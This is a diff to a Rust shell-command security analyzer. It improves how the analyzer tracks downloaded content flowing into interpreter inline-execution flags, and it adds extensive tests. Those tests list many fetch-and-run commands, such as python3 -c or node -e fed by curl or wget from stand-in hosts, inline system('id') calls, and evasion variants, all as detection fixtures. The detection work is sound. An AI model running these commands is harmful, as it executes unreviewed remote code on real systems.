+    if depth > MAX_SHELL_SUBSTITUTION_EVAL_DEPTH || body.len() > MAX_SHELL_DATAFLOW_WORD_BYTES {
+        return false;
+    }
+    let (_, segments, _) = bounded_command_analysis_segments(body, ShellType::Posix);
+    let mut pipe_download = false;
+    let mut completed_download = false;
+    for (index, segment) in segments.iter().enumerate() {
+        let pipe_connected = matches!(segment.preceding_separator.as_deref(), Some("|" | "|&"));
+        if !pipe_connected {
+            completed_download |= pipe_download;
+            pipe_download = false;
+        }
+        let outgoing = segments
+            .get(index + 1)
+            .and_then(|next| next.preceding_separator.as_deref());
+        let routing = ordered_fd_routing(
+            segment,
+            ShellType::Posix,
+            if pipe_download {
+                FlowProof::Sensitive
+            } else {
+                FlowProof::Clean
+            },
+            outgoing,
+        );
+        let mut output_download = false;
+        if let Ok(effective) = resolve_effective_segment(segment, ShellType::Posix) {
+            if let Some(command) = effective.command.as_deref() {
+                let command = normalize_cmd_base(command, ShellType::Posix);
+                if let Ok(args) = dataflow_segment_args(&effective, ShellType::Posix) {
+                    output_download = fetch_emits_download(&command, &args)
+                        || (routing.stdin == FlowProof::Sensitive
+                            && crate::env_guard::is_data_preserving_transform(&command));
+                    if !output_download && nested_output_preserving_command(&command) {
+                        let argument_download = args.iter().position(|raw| {
+                            parse_posix_shell_word(raw)
+                                .substitutions
+                                .iter()
+                                .any(|substitution| {
+                                    substitution_emits_download(&substitution.body, depth + 1)
+                                })
+                        });
+                        output_download = (command == "printf" && argument_download == Some(0))
+                            || (argument_download.is_some()
+                                && (command == "echo"
+                                    || printf_arg_file_output(
+                                        FlowProof::Sensitive,
+                                        &args,
+                                        ShellType::Posix,
+                                    ) == FlowProof::Sensitive));
+                    }
+                }
+            }
+        }
+        if !output_download {
+            let (nested, _) =
+                crate::extract::executable_body_occurrences(segment, ShellType::Posix, outgoing);
+            output_download = nested.iter().any(|occurrence| {
+                occurrence.relation == crate::extract::ExecutableRelation::WrapperReplacement
+                    && occurrence.body.shell == ShellType::Posix
+                    && substitution_emits_download(&occurrence.body.input, depth + 1)
+            });
+        }
+        pipe_download = output_download && routing.stdout == FdDestination::ParentStdout;
+    }
+    completed_download || pipe_download
 }
 
 const MAX_SHELL_DATAFLOW_WORD_BYTES: usize = 64 * 1024;
@@ -6221,17 +7083,19 @@ fn split_posix_dataflow_words(input: &str) -> Result<Vec<String>, ()> {
     Ok(words)
 }
 
+/// The segment's argv words with shell quoting retained, in the tokenizer's
+/// argv shape: a redirection before the command word or joined to a word is
+/// not an argv word, and redirections follow the argv.
 fn dataflow_segment_args(segment: &tokenize::Segment, shell: ShellType) -> Result<Vec<String>, ()> {
     let env_split_raw = segment.raw.strip_prefix(ENV_SPLIT_DATAFLOW_LITERAL_PREFIX);
     if shell != ShellType::Posix && env_split_raw.is_none() {
         return Ok(segment.args.clone());
     }
     let words = split_posix_dataflow_words(env_split_raw.unwrap_or(&segment.raw))?;
-    let command_index = words
-        .iter()
-        .position(|word| !tokenize::is_env_assignment(&normalize_shell_token(word, shell)))
-        .ok_or(())?;
-    Ok(words[command_index + 1..].to_vec())
+    match tokenize::posix_command_and_args(words) {
+        (Some(_), args) => Ok(args),
+        (None, _) => Err(()),
+    }
 }
 
 fn capture_posix_substitution(chars: &[char], start: usize) -> Result<(String, usize), ()> {
@@ -8953,8 +9817,27 @@ fn ordered_fd_routing(
             };
             complete &= target.is_some();
         } else if character == '>' {
-            descriptors.insert(fd, FdDestination::Other);
-            complete &= target.is_some();
+            // Opening a descriptor's device file reaches that descriptor's
+            // current destination, as `>&N` does.
+            let device_fd = target
+                .as_deref()
+                .map(|target| normalize_shell_token(target, shell))
+                .and_then(|target| match target.as_str() {
+                    "/dev/stdout" => Some(1),
+                    "/dev/stderr" => Some(2),
+                    _ => target
+                        .strip_prefix("/dev/fd/")
+                        .or_else(|| target.strip_prefix("/proc/self/fd/"))
+                        .and_then(|number| number.parse::<u8>().ok()),
+                });
+            let destination = device_fd.map_or(FdDestination::Other, |device_fd| {
+                descriptors
+                    .get(&device_fd)
+                    .copied()
+                    .unwrap_or(FdDestination::Unknown)
+            });
+            descriptors.insert(fd, destination);
+            complete &= target.is_some() && destination != FdDestination::Unknown;
         }
         index = cursor.max(index + 1);
     }
@@ -14026,6 +14909,358 @@ mod tests {
         assert!(check_default("php -r 'print(1);'", ShellType::Posix)
             .iter()
             .all(|f| f.rule_id != RuleId::InterpreterSuspiciousInlineExec));
+    }
+
+    #[test]
+    fn downloaded_inline_programs_follow_real_interpreter_argument_roles() {
+        for input in [
+            r#"python3 -c "$(curl -s https://get.example.com/x.py)""#,
+            r#"node -e "$(curl -s https://get.example.com/x.js)""#,
+            r#"python3 -u -W ignore -X dev -c "$(curl -fsSL https://example.com/x.py)""#,
+            r#"python3 -uc "$(curl https://example.com/x.py)""#,
+            r#"python3 -c"$(curl https://example.com/x.py)""#,
+            r#"node --eval="$(curl https://example.com/x.js)""#,
+            r#"node --print "$(curl https://example.com/x.js)""#,
+            r#"node -p "$(curl https://example.com/x.js)""#,
+            r#"node -pe "$(curl https://example.com/x.js)""#,
+            r#"nodejs -e "$(curl https://example.com/x.js)""#,
+            r#"'python3' '-c' "$('/usr/bin/curl' '-s' 'https://example.com/x.py')""#,
+            r#"env LANG=C python3 -c "$(command curl https://example.com/x.py)""#,
+            r#"sudo -u nobody command python3 -c "$(env curl https://example.com/x.py)""#,
+            r#"timeout 10 node -e "$(curl https://example.com/x.js)""#,
+            r#"sh -c 'python3 -c "$(curl https://example.com/x.py)"'"#,
+            r#"python3 -c "$(sh -c 'curl https://example.com/x.py')""#,
+            r#"node -e "`curl https://example.com/x.js`""#,
+            r#"python3 -c "$(wget -qO- https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -fsSLo - https://example.com/x.py)""#,
+            r#"python3 -c "$(curl https://example.com/x.py | cat)""#,
+            r#"python3 -c "$(printf %s "$(curl https://example.com/x.py)")""#,
+            r#"python3 -c "$(printf "$(curl https://example.com/x.py)")""#,
+            r#"python3 -c "$(fetch -o - https://example.com/x.py)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|finding| {
+                    finding.rule_id == RuleId::InterpreterSuspiciousInlineExec
+                        && finding.severity == Severity::High
+                }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn inline_programs_survive_unknown_options_redirections_and_unsplittable_words() {
+        for input in [
+            r#"node --title x -e "$(curl -s https://example.com/x.js)""#,
+            r#"node -C development -e "$(curl https://example.com/x.js)""#,
+            r#"node --unlisted-option value --eval "$(curl https://example.com/x.js)""#,
+            r#"bun --cwd /tmp -e "$(curl https://example.com/x.js)""#,
+            r#"python3 2>/dev/null -c "$(curl https://example.com/x.py)""#,
+            r#"2>/dev/null python3 -c "$(curl https://example.com/x.py)""#,
+            r#"python3 -Pc "$(curl https://example.com/x.py)""#,
+            r#"python3 -uW ignore -c "$(curl https://example.com/x.py)""#,
+            r#"node --title x -e "require('child_process').execSync('id')""#,
+            r#"ruby -C /tmp -e "system('id')""#,
+            r#"python3 2>/dev/null -c "import os; os.system('id')""#,
+            "python3 -c 'import os; os.system(\"id\")' \\",
+            "perl -lne 'system(\"id\")'",
+            "ruby -we 'system(\"id\")'",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings.iter().any(|finding| {
+                    finding.rule_id == RuleId::InterpreterSuspiciousInlineExec
+                        && finding.severity == Severity::High
+                }),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            r#"node --no-warnings app.js -e "$(curl https://example.com/data)""#,
+            r#"node --inspect app.js -e "$(curl https://example.com/data)""#,
+            r#"python3 -X dev script.py -c "$(curl https://example.com/data)""#,
+            r#"python3 2>/dev/null script.py -c "$(curl https://example.com/data)""#,
+            "perl -pie 'print' file.txt",
+            "python3 -c 'print(1)' \\",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn repeated_inline_options_check_every_program_the_interpreter_runs() {
+        let programs = |interpreter: &str, args: &[&str]| {
+            let args: Vec<String> = args.iter().map(|arg| arg.to_string()).collect();
+            extract_inline_programs(&args, interpreter, ShellType::Posix)
+                .into_iter()
+                .map(|program| program.source)
+                .collect::<Vec<_>>()
+        };
+        assert_eq!(
+            programs(
+                "perl",
+                &[
+                    "-le",
+                    "print 1;",
+                    "-E",
+                    "say 2;",
+                    "-eprint 3",
+                    "file",
+                    "-e",
+                    "4"
+                ]
+            ),
+            ["print 1;", "say 2;", "print 3"]
+        );
+        assert_eq!(
+            programs("node", &["-p", "1", "--eval=2", "-pe", "3", "-e", "4"]),
+            ["1", "2", "3", "4"]
+        );
+        assert_eq!(programs("python3", &["-c", "a", "-c", "b"]), ["a"]);
+        assert_eq!(programs("php", &["-r", "a", "-r", "b"]), ["a"]);
+
+        for input in [
+            r#"node -p 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node --print 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node --eval=1 -e 'require("child_process").execSync("id")'"#,
+            r#"node -pe 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node -e 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node -p 'require("child_process").execSync("id")' -e 1"#,
+            r#"nodejs --eval 1 --eval 'require("child_process").execSync("id")'"#,
+            r#"bun --eval 1 -e 'require("child_process").execSync("id")'"#,
+            r#"perl -E 'say 1;' -e 'system("id")'"#,
+            r#"perl -e 'print 1;' -E 'system("id")'"#,
+            r#"perl -ne 'print;' -e 'system("id")' file.txt"#,
+            r#"perl -le 'system("id")' -e 1"#,
+            r#"sudo perl -le 'print 1;' -e 'system("id")'"#,
+            r#"ruby -ne 'puts 1' -e 'system("id")'"#,
+            r#"ruby -e 1 -e 'system("id")'"#,
+            r#"python3 -Bc 'print(1)' -c 'import os; os.system("id")'"#,
+            r#"node app.js -p 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node --experimental-default-type module -e 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node --experimental-test-isolation none -p 1 -e 'require("child_process").execSync("id")'"#,
+            r#"node --experimental-default-type module -e 1 -e "$(curl -fsSL https://example.com/x.js)""#,
+            r#"node -e 1 -e "$(curl -fsSL https://example.com/x.js)""#,
+            r#"node --trace-sigint -e "$(curl -fsSL https://example.com/x.js)""#,
+            r#"node --enable-fips -p 1 -e 'require("child_process").execSync("id")'"#,
+            r#"ruby -e 'puts 1' -e "$(curl -fsSL https://example.com/x.rb)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| finding.rule_id == RuleId::InterpreterSuspiciousInlineExec),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            r#"node -p 1 -e "console.log(2)""#,
+            r#"node --experimental-default-type module -e 'console.log(1)' -e 'console.log(2)'"#,
+            r#"node --experimental-strip-types app.ts -e 1 -e 'require("child_process").execSync("id")'"#,
+            r#"perl -le "print 1" -e "print 2""#,
+            r#"ruby -e "puts 1" -e "puts 2""#,
+            r#"node -e 1 -e "$(printf data)""#,
+            r#"python3 -c "print(1)" -c x"#,
+            r#"python3 -c 'print(1)' -c 'import os; os.system("id")'"#,
+            r#"python3 -c 'print(1)' -c "$(curl -fsSL https://example.com/x.py)""#,
+            r#"php -r 'echo 1;' -r 'system("id");'"#,
+            r#"node app.js -e 1 -e 'require("child_process").execSync("id")'"#,
+            r#"perl script.pl -e 1 -e 'system("id")'"#,
+            r#"node --trace-sigint app.js -e "$(curl -fsSL https://example.com/data)""#,
+            r#"node --enable-fips --test-only app.js -e "$(curl -fsSL https://example.com/data)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| finding.rule_id != RuleId::InterpreterSuspiciousInlineExec),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn downloaded_inline_source_reaches_stdout_through_device_files_and_late_options() {
+        for input in [
+            r#"python3 -c "$(curl -o /dev/stdout https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --output /dev/fd/1 https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -so/proc/self/fd/1 https://example.com/x.py)""#,
+            r#"python3 -c "$(curl https://example.com/x.py > /dev/stdout)""#,
+            r#"python3 -c "$(curl https://example.com/x.py 2>/dev/null >/dev/fd/1)""#,
+            r#"python3 -c "$(wget -O /dev/stdout https://example.com/x.py)""#,
+            r#"python3 -c "$(wget -qO/dev/stdout https://example.com/x.py)""#,
+            r#"python3 -c "$(curl https://example.com/x.py --remote-name-all)""#,
+            r#"python3 -c "$(curl https://example.com/x.py --remote-name-all https://example.com/y.py)""#,
+            r#"python3 -c "$(curl -K /tmp/curl.cfg)""#,
+            r#"python3 -c "$(curl --config /tmp/curl.cfg -o /tmp/x.py https://example.com/x.py)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| { finding.rule_id == RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            r#"python3 -c "$(curl -o /dev/stderr https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl https://example.com/x.py >/dev/stderr; printf 'print(1)')""#,
+            r#"python3 -c "$(curl https://example.com/x.py >/dev/fd/2; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/x.py -o /tmp/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(wget -O /tmp/x.py https://example.com/x.py; printf 'print(1)')""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn fixed_programs_and_downloads_used_only_as_data_are_not_inline_execution() {
+        for input in [
+            "python3 -c 'print(1)'",
+            r#"node -e 'console.log("curl https://example.com/x.js")'"#,
+            r#"python3 -c 'print("curl https://example.com/x.py")'"#,
+            r#"python3 -c '$(curl https://example.com/x.py)'"#,
+            r#"python3 -c 'import sys; print(sys.argv[1])' "$(curl https://example.com/data)""#,
+            r#"node -e 'console.log(process.argv[1])' "$(curl https://example.com/data)""#,
+            r#"python3 script.py -c "$(curl https://example.com/data)""#,
+            r#"python3 -m json.tool -c "$(curl https://example.com/data)""#,
+            r#"python3 -- -c "$(curl https://example.com/data)""#,
+            r#"node app.js -e "$(curl https://example.com/data)""#,
+            r#"node -- -e "$(curl https://example.com/data)""#,
+            r#"printf %s "$(curl https://example.com/data)""#,
+            r#"python3 -c "$(echo 'print(1) # curl https://example.com/x.py')""#,
+            r#"node -e "$(curl -o /tmp/example.js https://example.com/x.js; printf %s 'console.log(1)')""#,
+            r#"python3 -c "$(curl https://example.com/x.py >/tmp/example.py; echo 'print(1)')""#,
+            r#"python3 -c "$(curl https://example.com/x.py >&2; echo 'print(1)')""#,
+            r#"python3 -c "$(wget https://example.com/x.py)""#,
+            r#"python3 -c "$(curl https://example.com/data | wc -c)""#,
+            r#"python3 -c "$(printf '%d' "$(curl https://example.com/data)")""#,
+            r#"env -S 'node -e "$(curl https://example.com/x.js)"'"#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn curl_stdout_routing_consumes_long_and_short_option_values() {
+        for input in [
+            r#"python3 -c "$(curl --user-agent '-o/tmp/unused' https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --user-agent '-O' https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --header '--remote-name-all' https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --header '--next' https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -A-o/tmp/unused https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -H '-O' --url https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -o "$(printf %s -)" https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -o"`printf %s -`" https://example.com/x.py)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| { finding.rule_id == RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            r#"python3 -c "$(curl --user-agent '-o-' -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --header '--next' -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --output="$(printf %s /tmp/example.py)" https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl -o"`printf %s /tmp/example.py`" https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl -A-O -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --proxy https://proxy.example:8443 -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --doh-url https://dns.example/dns-query -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --resolve example.com:443:192.0.2.1 -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --connect-to example.com:443:peer.example:443 -o /tmp/example.py https://example.com/x.py; printf 'print(1)')""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn curl_inline_downloads_follow_output_slots_and_next_groups() {
+        for input in [
+            r#"python3 -c "$(curl -O https://example.com/data.txt https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --remote-name https://example.com/data.txt --url https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -o /tmp/data.txt https://example.com/data.txt https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/data.txt --next https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/data.txt -: https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -O https://example.com/data.txt --next https://example.com/x.py)""#,
+            r#"python3 -c "$(curl https://example.com/x.py --next -o /tmp/data.txt https://example.com/data.txt)""#,
+            r#"python3 -c "$(curl --remote-name-all --no-remote-name https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --remote-name-all -o - https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --remote-name-all --no-remote-name-all https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -O -o - https://example.com/data.txt https://example.com/x.py)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| { finding.rule_id == RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            r#"python3 -c "$(curl -O -O https://example.com/a.py https://example.com/b.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/a.py https://example.com/b.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl -O -o /tmp/b.py https://example.com/a.py https://example.com/b.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/a.py --next -O https://example.com/b.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl -O https://example.com/a.py -: --remote-name-all https://example.com/b.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl -O https://example.com/a.py -s:o/tmp/b.py https://example.com/b.py; printf 'print(1)')""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn curl_auxiliary_peers_still_participate_in_network_policy() {
+        for input in [
+            "curl --proxy https://peer.example:8443 -o /tmp/example.py https://example.com/x.py",
+            "curl --doh-url https://peer.example/dns-query -o /tmp/example.py https://example.com/x.py",
+            "curl --connect-to example.com:443:peer.example:443 -o /tmp/example.py https://example.com/x.py",
+            "curl --resolve example.com:443:192.0.2.1 -o /tmp/example.py https://example.com/x.py",
+        ] {
+            let findings = check_network_policy(
+                input,
+                ShellType::Posix,
+                &["peer.example".into(), "192.0.2.1".into()],
+                &[],
+            );
+            assert!(findings.iter().any(|finding| {
+                finding.rule_id == RuleId::CommandNetworkDeny
+            }), "{input}: {findings:?}");
+        }
     }
 
     #[test]
